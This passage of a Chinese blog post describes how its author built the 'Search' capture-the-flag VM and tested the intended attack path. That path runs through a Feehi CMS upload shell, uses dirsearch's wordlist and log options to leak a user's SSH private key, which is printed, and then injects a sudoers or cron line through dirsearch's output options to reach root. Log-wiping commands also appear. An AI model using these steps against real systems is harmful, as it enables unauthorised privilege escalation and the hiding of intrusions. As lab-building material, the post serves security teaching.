</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p><img src="/medias/maze-mao/33.png" alt=""></p> <p>给 www-data 用户授予 sudo -u 7r1umphk dirsearch 权限</p> <blockquote><p>使用 visudo 编辑 Sudoers 文件，它会进行语法检查，防止因配置错误导致 sudo 权限失效</p></blockquote> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">sudo</span> visudo
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>删除原有的 welcome sudo 配置</p> <p><img src="/medias/maze-mao/34.png" alt=""></p> <p>添加两条 sudo 配置</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>www-data <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>7r1umphk<span class="token punctuation">)</span> NOPASSWD: /usr/local/bin/dirsearch
7r1umphk <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/local/bin/dirsearch
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><img src="/medias/maze-mao/35.png" alt=""></p> <p>修改完成，按 <code>Ctrl+X</code>，然后按 <code>Y</code> 保存退出</p> <h2 id="_7、给-7r1umphk-用户准备-ssh-公钥私钥对"><a href="#_7、给-7r1umphk-用户准备-ssh-公钥私钥对" class="header-anchor">#</a> 7、给 7r1umphk 用户准备 SSH 公钥私钥对</h2> <p>生成 ed25519 密钥对</p> <blockquote><p>-t 指定密钥类型为 ed25519，-f 指定密钥文件保存路径，-N '' 表示不设置密码</p></blockquote> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">su</span> - 7r1umphk
<span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /home/7r1umphk/.ssh
<span class="token function">chmod</span> <span class="token number">700</span> /home/7r1umphk/.ssh
<span class="token builtin class-name">cd</span> ~/.ssh
ssh-keygen <span class="token parameter variable">-t</span> ed25519 <span class="token parameter variable">-f</span> /home/7r1umphk/.ssh/id_ed25519 <span class="token parameter variable">-N</span> <span class="token string">''</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p><img src="/medias/maze-mao/36.png" alt=""></p> <p>配置公钥</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">cat</span> /home/7r1umphk/.ssh/id_ed25519.pub <span class="token operator">&gt;&gt;</span> /home/7r1umphk/.ssh/authorized_keys
<span class="token function">chmod</span> <span class="token number">600</span> /home/7r1umphk/.ssh/authorized_keys
<span class="token function">cat</span> /home/7r1umphk/.ssh/authorized_keys
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p><img src="/medias/maze-mao/37.png" alt=""></p> <p>出题人可以留一份私钥备份，方便测试</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>7r1umphk@Search:~/.ssh$ <span class="token function">cat</span> id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACB9rlG1TssRfMc1WmPsKjHLmwwVG0ukYvKa4mMkYsmWyAAAAJg+y+ADPsvg
AwAAAAtzc2gtZWQyNTUxOQAAACB9rlG1TssRfMc1WmPsKjHLmwwVG0ukYvKa4mMkYsmWyA
AAAECPxip0hGT4O48HAkEWglmNjSaDrr8tXi1W+inEP7eAS32uUbVOyxF8xzVaY+wqMcub
<span class="token assign-left variable">DBUbS6Ri8priYyRiyZbIAAAADzdyMXVtcGhrQFNlYXJjaAECAwQFBg</span><span class="token operator">==</span>
-----END OPENSSH PRIVATE KEY-----
7r1umphk@Search:~/.ssh$ <span class="token function">cat</span> authorized_keys 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH2uUbVOyxF8xzVaY+wqMcubDBUbS6Ri8priYyRiyZbI 7r1umphk@Search
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p><strong>以上操作仅靶机实验环境演示，不适用于实际生产环境，建议保存私钥后删除服务端私钥文件。</strong></p> <h2 id="_8、root-家目录准备"><a href="#_8、root-家目录准备" class="header-anchor">#</a> 8、root 家目录准备</h2> <p>删除 root 家目录默认 root.txt 文件</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">rm</span> /root/root.txt
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>在root家目录创建 .ssh 目录，给选手多一个提权选择，脏数据写入公钥</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /root/.ssh
<span class="token function">chmod</span> <span class="token number">700</span> /root/.ssh
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h2 id="_9、放置-flag"><a href="#_9、放置-flag" class="header-anchor">#</a> 9、放置 flag</h2> <p>使用随机uuid 生成 flag 内容，靶机没有 uuidgen，回到我的kali本地</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>┌──<span class="token punctuation">(</span>npc㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
└─$ uuidgen <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">'-'</span>
681db772f6844d4c84da083c3d280954
                                                                                                                                                       
┌──<span class="token punctuation">(</span>npc㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
└─$ uuidgen <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">'-'</span>
499f7ecdb8434a7a962b9d5c6d88edce
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>在 用户家目录 下创建 user.txt，但我为了避免选手直接猜中 /root/root.txt 这种常规路径，这里把 root flag 文件随机命名为 /root/uuid.txt</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token builtin class-name">echo</span> <span class="token string">'flag{user-681db772f6844d4c84da083c3d280954}'</span> <span class="token operator">&gt;</span> /home/7r1umphk/user.txt
<span class="token builtin class-name">echo</span> <span class="token string">'flag{root-499f7ecdb8434a7a962b9d5c6d88edce}'</span> <span class="token operator">&gt;</span> /root/499f7ecdb8434a7a962b9d5c6d88edce.txt
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>权限控制，家目录仅允许用户自己操作</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">chmod</span> <span class="token number">700</span> /home/7r1umphk/
<span class="token function">chown</span> 7r1umphk:7r1umphk /home/7r1umphk/user.txt
<span class="token function">chmod</span> <span class="token number">600</span> /home/7r1umphk/user.txt
<span class="token function">chmod</span> <span class="token number">600</span> /root/499f7ecdb8434a7a962b9d5c6d88edce.txt
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>权限确认，确认目录、文件都是预期权限</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">ls</span> <span class="token parameter variable">-alh</span> /home/
<span class="token function">ls</span> <span class="token parameter variable">-alh</span> /root/
<span class="token function">ls</span> <span class="token parameter variable">-lah</span> /home/7r1umphk/.ssh
<span class="token function">ls</span> <span class="token parameter variable">-alh</span> /home/7r1umphk/user.txt
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p><img src="/medias/maze-mao/38.png" alt=""></p> <h2 id="_10、擦除痕迹"><a href="#_10、擦除痕迹" class="header-anchor">#</a> 10、擦除痕迹</h2> <p style="color:red;">不建议直接在构建好的靶机上进行测试操作，可以选择把构建好的靶机导出一份 ova，作为新的靶机导入 VBox 进行测试。</p> <p>这里只是为了让导出的 OVA 看起来更“干净”，避免泄露出题时的个人操作记录，并不能真正抹除所有痕迹。</p> <p><img src="/medias/maze-mao/39.png" alt=""></p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">rm</span> /root/.viminfo
<span class="token function">rm</span> /root/.python_history
<span class="token function">rm</span> /root/.mysql_history

<span class="token function">ln</span> <span class="token parameter variable">-s</span> /dev/null /root/.viminfo
<span class="token function">ln</span> <span class="token parameter variable">-s</span> /dev/null /root/.python_history
<span class="token function">ln</span> <span class="token parameter variable">-s</span> /dev/null /root/.mysql_history
<span class="token comment"># 清常见文本日志</span>
<span class="token operator">&gt;</span> /var/log/apache2/access.log
<span class="token operator">&gt;</span> /var/log/apache2/error.log
<span class="token operator">&gt;</span> /var/log/auth.log
<span class="token operator">&gt;</span> /var/log/syslog
<span class="token operator">&gt;</span> /var/log/apt/history.log
<span class="token operator">&gt;</span> /var/log/apt/term.log
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><h2 id="_11、靶机导出"><a href="#_11、靶机导出" class="header-anchor">#</a> 11、靶机导出</h2> <p>导出虚拟机</p> <p><img src="/medias/maze-mao/41.png" alt=""></p> <p>指定靶机</p> <p><img src="/medias/maze-mao/42.png" alt=""></p> <p>导出路径选择</p> <p><img src="/medias/maze-mao/43.png" alt=""></p> <p>导出后，可以把这个靶机ova文件分发给选手</p> <p><img src="/medias/maze-mao/44.png" alt=""></p> <h2 id="_12、测试"><a href="#_12、测试" class="header-anchor">#</a> 12、测试</h2> <p>存活主机扫描、端口扫描过程略</p> <p>80 端口目录扫描</p> <p><img src="/medias/maze-mao/48.png" alt=""></p> <p>通过 setup.txt admin：MazeSec2025 进入后台，复现 https://github.com/liufee/cms/issues/70</p> <p><img src="/medias/maze-mao/49.png" alt=""></p> <p><img src="/medias/maze-mao/50.png" alt=""></p> <p>读取公钥</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">touch</span> /tmp/111
<span class="token function">chmod</span> <span class="token number">777</span> /tmp/111
<span class="token function">sudo</span> <span class="token parameter variable">-u</span> 7r1umphk dirsearch <span class="token parameter variable">-u</span> http://127.0.0.1/ <span class="token parameter variable">-w</span> /home/7r1umphk/.ssh/authorized_keys <span class="token parameter variable">--log</span><span class="token operator">=</span>/tmp/111
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>可以看出是 ed25519算法生成</p> <p><img src="/medias/maze-mao/51.png" alt=""></p> <p>尝试读取私钥</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">rm</span> /tmp/111
<span class="token function">touch</span> /tmp/111
<span class="token function">chmod</span> <span class="token number">777</span> /tmp/111
<span class="token function">sudo</span> <span class="token parameter variable">-u</span> 7r1umphk dirsearch <span class="token parameter variable">-u</span> http://127.0.0.1/ <span class="token parameter variable">-w</span>  /home/7r1umphk/.ssh/id_ed25519 <span class="token parameter variable">--log</span><span class="token operator">=</span>/tmp/111 <span class="token parameter variable">-t</span> <span class="token number">1</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>并发扫描，读取私钥的行顺序有点乱了，可以指定线程数为1，拼接出完整私钥</p> <div class="language-plaintext line-numbers-mode"><pre class="language-plaintext"><code>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACB9rlG1TssRfMc1WmPsKjHLmwwVG0ukYvKa4mMkYsmWyAAAAJg+y+ADPsvg
AwAAAAtzc2gtZWQyNTUxOQAAACB9rlG1TssRfMc1WmPsKjHLmwwVG0ukYvKa4mMkYsmWyA
AAAECPxip0hGT4O48HAkEWglmNjSaDrr8tXi1W+inEP7eAS32uUbVOyxF8xzVaY+wqMcub
DBUbS6Ri8priYyRiyZbIAAAADzdyMXVtcGhrQFNlYXJjaAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p><img src="/medias/maze-mao/52.png" alt=""></p> <p><img src="/medias/maze-mao/53.png" alt=""></p> <p>sudo 配置文件有容错性，构造个 sudo 给 7r1umphk</p> <blockquote><p>另外你还可以选择尝试控制输出写入公钥，如果靶机是 alpine ，你还可以尝试 定时任务。</p></blockquote> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>7r1umphk <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL:ALL<span class="token punctuation">)</span> NOPASSWD: ALL
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>构造 payload</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">rm</span> /tmp/222
<span class="token function">touch</span> /tmp/222
<span class="token function">chmod</span> <span class="token number">777</span> /tmp/222
<span class="token function">sudo</span> <span class="token parameter variable">-u</span> root dirsearch <span class="token parameter variable">-u</span> http://127.0.0.1/ <span class="token parameter variable">-o</span> /etc/sudoers.d/sbash  <span class="token parameter variable">--format</span><span class="token operator">=</span>plain <span class="token parameter variable">--log</span><span class="token operator">=</span><span class="token string">'
7r1umphk ALL=(ALL:ALL) NOPASSWD: ALL
'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p><img src="/medias/maze-mao/54.png" alt=""></p> <h2 id="_13、出题人分享-可选"><a href="#_13、出题人分享-可选" class="header-anchor">#</a> 13、出题人分享（可选）</h2> <p>靶机构建之前，相信你已经有了完整的思路，你是否愿意分享更多细节让选手在靶机截至后了解这个靶机？</p> <div class="language-plaintext line-numbers-mode"><pre class="language-plaintext"><code>01、靶机灵感：最近学习到什么新的骚姿势让你迫不及待构建一台靶机与群友分享，或者你希望构建一台靶机让群友学到什么新东西？
02、靶机用户：这个靶机都有哪些用户？
03、靶机细节：分享下这台靶机的细节。
04、攻击流程简述：简单讲讲攻击流程。
05、靶机重点：你最想让选手学到的点是什么？
06、选手卡点：你觉得选手可能会卡在哪些点？
07、可行测试：你能否在本地环境成功测试？
08、靶机名称：这个靶机名字有什么故事吗？
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p><strong>01、靶机灵感</strong></p> <p>前段时间老夜出了 spiteful 靶机，其中最后的提权点是 rkhunter 工具的参数功能挖掘，有群友通过配置文件执行脚本拿到了提权，比较优雅。我通过挖掘 rkhunter 工具的参数，观察工具写入日志的行为，发现日志似乎可控，于是有了控制日志内容写入，在日志数据格式不完全可控条件下，可以构造出部分一行或多行可控内容，另外我总结了三种写入内容不完全可控下的提权：1、写入一行公钥，2、定时任务，3、sudoers.d 授权文件，具体看<a href="https://the0n3.top/pages/linux-config-privesc/" target="_blank" rel="noopener noreferrer">利用配置文件内容容错性实现权限提升的三种方式<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>在老夜这个靶机的启发下，我深入挖掘了一下 dirsearch 的参数功能，发现它也存在类似的写入内容不完全可控的场景，于是我设计了这个靶机，让选手通过挖掘 dirsearch 的参数功能实现提权。</p> <p><strong>02、靶机用户</strong></p> <ul><li>www-data (web 入口)</li> <li>7r1umphk (关键用户)</li> <li>root</li></ul> <p><strong>03、靶机细节</strong></p> <p>1、入口选择了 Github 上一个开源 CMS 框架，通过常规端口扫描即可发现 80 端口，再结合指纹/标题/路径信息可以识别出是 Feehi CMS。</p> <p>Feehi CMS地址：<a href="https://github.com/liufee/cms" target="_blank" rel="noopener noreferrer">https://github.com/liufee/cms<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a><br>
文件上传getshell issue地址：<a href="https://github.com/liufee/cms/issues/70" target="_blank" rel="noopener noreferrer">https://github.com/liufee/cms/issues/70<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>2、给www-data用户授予了sudo -u 7r1umphk 权限，利用 dirsearch 的 <code>-w</code> 参数指定 7r1umphk 用户私钥作为字典，让 dirsearch 以 7r1umphk 身份读取该文件，并通过 <code>--log</code> 参数把每一行内容拼接到请求 URL 中写入日志文件，从而间接泄露 7r1umphk 的私钥内容。（甜品级利用）</p> <p>利用条件：</p> <ul><li>1、任意web站点</li> <li>2、任意文件读取</li> <li>3、存在可写可读目录（/tmp）</li> <li>4、使用--log参数指定可读文件</li></ul> <p>演示（节选部分）：</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>┌──<span class="token punctuation">(</span>npc㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/test<span class="token punctuation">]</span>
└─$ <span class="token function">touch</span> /tmp/dirsearch.log <span class="token operator">&amp;&amp;</span> <span class="token function">chmod</span> <span class="token number">777</span> /tmp/dirsearch.log

┌──<span class="token punctuation">(</span>npc㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/test<span class="token punctuation">]</span>
└─$ dirsearch <span class="token parameter variable">-u</span> http://127.0.0.1/  <span class="token parameter variable">-w</span> /etc/passwd <span class="token parameter variable">--log</span><span class="token operator">=</span>/tmp/dirsearch.log

┌──<span class="token punctuation">(</span>npc㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/test<span class="token punctuation">]</span>
└─$ <span class="token function">cat</span> /tmp/dirsearch.log
<span class="token number">2025</span>-12-07 01:36:13,771 <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> <span class="token string">&quot;GET http://127.0.0.1/mail:x:8:8:mail:/var/mail:/usr/sbin/nologin&quot;</span> <span class="token number">404</span> - 335B
<span class="token number">2025</span>-12-07 01:36:13,773 <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> <span class="token string">&quot;GET http://127.0.0.1/bin:x:2:2:bin:/bin:/usr/sbin/nologin&quot;</span> <span class="token number">404</span> - 335B
<span class="token number">2025</span>-12-07 01:36:13,775 <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> <span class="token string">&quot;GET http://127.0.0.1/nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin&quot;</span> <span class="token number">404</span> - 335B
<span class="token number">2025</span>-12-07 01:36:13,777 <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> <span class="token string">&quot;GET http://127.0.0.1/root:x:0:0:root:/root:/usr/bin/zsh&quot;</span> <span class="token number">404</span> - 335B
<span class="token number">2025</span>-12-07 01:36:13,778 <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> <span class="token string">&quot;GET http://127.0.0.1/sync:x:4:65534:sync:/bin:/bin/sync&quot;</span> <span class="token number">404</span> - 335B
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p><img src="/medias/maze-mao/40.png" alt=""></p> <p>3、重命名 root.txt，避免被猜中常规路径 <code>/root/root.txt</code>，迫使选手挖掘其他参数功能，回家的诱惑（/root/）</p> <p>4、给 7r1umphk 用户授予了sudo -u root 权限，利用dirsearch -o 参数指定一个输出文件，再利用 format 参数指定输出格式为plain，这会记录 dirsearch 的扫描结果/运行信息，包括 dirsearch 的命令行启动参数，如果可以在启动命令行参数里插入一段单行可控的 payload（例如一条 sudo授权 行或一条 公钥），就可以把这段内容写入公钥、sudoers.d/实现提权，后续如何利用就随意了。</p> <p>利用条件：</p> <ul><li>1、构造可控web站点，确保dirsearch默认字典可以扫到东西，扫到东西才会生成输出文件</li> <li>2、利用 -o 参数控制任意文件</li> <li>3、使用 -format 参数指定输出类型为plain，这个类型下，会记录 dirsearch 的启动命令行参数</li> <li>4、使用 --log 参数值控制写入内容</li></ul> <p>演示：</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>┌──<span class="token punctuation">(</span>npc㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/test<span class="token punctuation">]</span>
└─$ dirsearch <span class="token parameter variable">-u</span> http://127.0.0.1/  <span class="token parameter variable">-o</span> <span class="token number">2</span>.txt <span class="token parameter variable">--format</span><span class="token operator">=</span>plain <span class="token parameter variable">--log</span> <span class="token string">'
* * * * * root /bin/bash -c whoami'</span>

Output File: <span class="token number">2</span>.txt
Log File: /home/npc/test/
* * * * * root /bin/bash <span class="token parameter variable">-c</span> <span class="token function">whoami</span>

Target: http://127.0.0.1/

<span class="token punctuation">[</span>01:26:07<span class="token punctuation">]</span> Starting: 
<span class="token punctuation">[</span>01:26:10<span class="token punctuation">]</span> <span class="token number">200</span> -  183B  - /2.txt
CTRL+C detected: Pausing threads, please wait<span class="token punctuation">..</span>.

┌──<span class="token punctuation">(</span>npc㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/test<span class="token punctuation">]</span>
└─$ <span class="token function">cat</span> <span class="token number">2</span>.txt 
<span class="token comment"># Dirsearch started Sun Dec  7 01:26:10 2025 as: /home/npc/.local/bin/dirsearch -u http://127.0.0.1/ -o 2.txt --format=plain --log </span>
* * * * * root /bin/bash <span class="token parameter variable">-c</span> <span class="token function">whoami</span>

<span class="token number">200</span>   183B   http://127.0.0.1/2.txt
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><p>补充细节：dirsearch 运行过程真的会把启动命令行的文件和目录创建出来，但是不重要</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>┌──<span class="token punctuation">(</span>npc㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/test<span class="token punctuation">]</span>
└─$ <span class="token function">ls</span>
<span class="token string">''</span><span class="token string">$'<span class="token entity" title="\n">\n</span>'</span>'111<span class="token string">'  '</span>'<span class="token string">$'<span class="token entity" title="\n">\n</span>'</span>'* * * * * root '
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p><img src="/medias/maze-mao/1.png" alt=""></p> <p><img src="/medias/maze-mao/2.png" alt=""></p> <p><strong>04、攻击流程简述</strong></p> <p>通过 CMS 文件上传漏洞拿到 www-data shell</p> <p>利用 dirsearch 读取 7r1umphk 用户私钥</p> <p>7r1umphk 用户利用 dirsearch 利用文件写提权</p> <p><strong>05、靶机重点</strong></p> <p>挖掘 dirsearch 文件写功能的潜力，重点是 -w、-o、-format、-log 参数的配合使用</p> <p>-w：指定扫描字典文件（这里被用来读取任意文件）
-o：控制任意位置写入文件
--format：控制写入文件的内容格式
--log：控制写入文件的内容</p> <p><strong>06、选手卡点</strong></p> <p>分析选手预期可能卡在哪里。</p> <p>1、依赖单一工具 dirsearch，dirsearch 默认扫描字典不包含 后台密码备份文件 setup.txt，选手未尝试其他常见字典，无法进入后台。</p> <p>2、选手尝试爆破登录后台 admin 用户密码，密码是 MazeSec2025 ，非常见弱口令，爆破无果，无法进入后台。</p> <p>3、选手未对 CMS 指纹特征进行信息收集及利用，没有在 Github 找到该开源 CMS 项目及 issue 中披露的文件上传 getshell 方案，尝试自主挖掘 CMS 框架漏洞，无果。</p> <p>4、选手通过 issue 披露的方案拿到 www-data shell 后，没有稳定优化 shell 环境，可能存在一些命令交互问题。</p> <p>5、选手未挖掘 dirsearch 的 读取字典功能，错失文件读取机会。</p> <p>6、选手尝试读取默认 id_rsa 私钥，未考虑到可能存在其他算法的私钥文件，如果 id_ed25519 ，错失提升到 7r1umphk 用户的机会。</p> <p>7、选手拿到 7r1umphk 用户 shell 后，未挖掘 dirsearch 的写入功能，仍使用 读取功能，读取 shadow 文件，爆破 root 用户密码，root 密码复杂度较高，爆破无果。</p> <p>8、选手发现 dirsearch 有写入功能，但未考虑到写入内容不完全可控的场景及 dirsearch 工具参数测试不充分，无法构造出可利用的 payload。</p> <p>读取功能挖掘：</p> <ul><li>1、任意web站点</li> <li>2、任意文件读取</li> <li>3、存在可写可读目录（/tmp）</li> <li>4、使用--log参数指定可读文件</li></ul> <p>写入功能挖掘：</p> <ul><li>1、构造可控web站点，确保dirsearch默认字典可以扫到东西，扫到东西时才会生成输出文件</li> <li>2、利用 -o 参数控制任意文件</li> <li>3、使用 -format 参数指定输出类型为plain，这个类型下，会记录 dirsearch 的启动命令行参数</li> <li>4、使用 --log 参数值控制写入内容，单引号构造换行</li></ul> <p><strong>07、可行测试</strong></p> <p>出题人本地测试可行</p> <p><strong>08、靶机名称</strong></p> <p>Search 靶机，靶机重点使用了 dirsearch 工具以及入口处 cms 考察的开源情报收集能力，所以给靶机取名 Search。</p> <p>小故事：</p> <p><img src="/medias/maze-mao/56.png" alt=""></p> <h2 id="_14、遇到的问题"><a href="#_14、遇到的问题" class="header-anchor">#</a> 14、遇到的问题</h2> <h3 id="问题1-靶机-apache-默认未启用-rewrite-模块"><a href="#问题1-靶机-apache-默认未启用-rewrite-模块" class="header-anchor">#</a> 问题1：靶机 apache 默认未启用 rewrite 模块</h3> <p>非预期：完成以上配置重启apache后，配置的工作目录 /var/www/html/frontend/web 没有生效<br>
原因：因为启用了包含 RewriteEngine 的 VirtualHost 配置，但未启用 rewrite 模块，导致配置语法检查不通过，apache2ctl configtest 报错，服务无法正常加载新的站点配置；<br>
结果就是：访问时仍然落在原来默认的 DocumentRoot /var/www/html，看起来像是“新配置没生效”。（具体表现取决于当时服务是否已经在运行：可能直接启动失败，也可能继续使用旧的配置。）</p> <h3 id="问题2-靶机默认无-mysql-服务"><a href="#问题2-靶机默认无-mysql-服务" class="header-anchor">#</a> 问题2：靶机默认无 MySQL 服务</h3> <p>现象：CMS 页面报 PDO 异常，提示连接 MySQL 失败。<br>
